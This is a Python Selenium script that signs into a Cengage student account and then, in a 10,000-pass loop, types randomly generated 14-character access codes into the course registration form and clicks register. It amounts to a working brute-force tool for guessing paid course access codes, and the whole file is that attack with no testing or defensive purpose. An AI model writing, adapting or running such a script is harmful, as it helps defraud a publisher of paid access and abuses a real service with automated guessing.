import random
from multiprocessing import Pool
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.service import Service as FirefoxService
import time

# Set the path to the WebDriver executable
driver = webdriver.Firefox()

# Open the desired URL
driver.get('https://student.cengage.com/dashboard/course-payment-options?courseKey=ccp+8163+5719')

characters = "1234567890QWERTYUIOPASDFGHJKLZXCVBNM"

def get_access_code():
    return ''.join(random.choice(characters) for _ in range(14))

try:
    # Wait until the username field is present
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, 'idp-discovery-username'))
    )

    # Find the username field and enter the username
    username_field = driver.find_element(By.ID, 'idp-discovery-username')
    username_field.send_keys('***')

    # Click to move to password field
    onto_password = driver.find_element(By.ID, 'idp-discovery-submit')
    onto_password.click()

    # Wait until the password field is present
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, 'okta-signin-password'))
    )

    # Find the password field and enter the password
    password_field = driver.find_element(By.ID, 'okta-signin-password')
    password_field.send_keys('***')

    # Find the sign-in button and click it
    sign_in_button = driver.find_element(By.ID, 'okta-signin-submit')
    sign_in_button.click()

    # Optional: Wait for some time to ensure the login process completes
    time.sleep(5)

    # Wait until the access code button is present
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, 'button[aria-label="Enter access code button"]'))
    )

    enter_access_code_field = driver.find_element(By.CSS_SELECTOR, 'button[aria-label="Enter access code button"]')
    enter_access_code_field.click()

    # Now proceed with the rest of your actions, like inputting a string and pressing register multiple times
    for _ in range(10000):
        # Find the input field
        input_field = driver.find_element(By.NAME, 'inputValue')  # Ensure this is the correct name attribute

        # Clear the input field (optional)
        input_field.clear()

        # Enter the string into the input field
        access_code = get_access_code()
        input_field.send_keys(access_code)

        # Wait until the register button is present
        WebDriverWait(driver, 2).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="product-modal-register-btn"]'))
        )

        # Find the register button
        register_button = driver.find_element(By.CSS_SELECTOR, '[data-testid="product-modal-register-btn"]')

        # Click the register button
        register_button.click()

        # Optional: Wait for some time before the next iteration (adjust as needed)
        time.sleep(1)

except Exception as e:
    print(f'An error occurred: {e}')
finally:
    # Close the WebDriver after the loop completes
    driver.quit()
